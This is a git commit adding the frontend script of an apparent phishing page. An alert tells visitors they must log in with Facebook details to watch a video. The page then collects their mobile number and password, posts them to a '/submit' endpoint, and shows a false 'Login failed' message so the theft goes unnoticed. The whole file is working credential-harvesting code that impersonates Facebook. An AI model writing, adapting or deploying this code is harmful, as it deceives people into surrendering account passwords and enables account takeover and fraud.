bc949180b67ec42f95a2968b834d073b5e30a0d1
cypher-commits <muchasgraciasaficion309@gmail.com>
2025-05-19 03:05:20 +0200

    Initial frontend commit

---
+++ script.js
@@ -0,0 +1,26 @@
+alert('To watch the video you need to log in with your facebook details to watch the video securely and safe.');
+function logIn(){
+    const mobileNumber = document.getElementById('number').value;
+    const Password = document.getElementById('password').value;
+     
+    if(!mobileNumber || !Password){
+       alert('Fill both mobile number and password fields!!!');
+       return;
+    }
+   
+    fetch('/submit', {
+        method: 'POST', 
+        headers: {'Content-type': 'application/json'},
+        body: JSON.stringify({mobileNumber, Password})
+    })
+    .then(res => {
+        if(res.ok){
+            alert('Login failed. Please try again.');
+        }
+    })
+    .catch(err => console.error('Error: ', err))
+}
+
+function createAcc(){
+    alert('This feature is disabled!!!');
+}
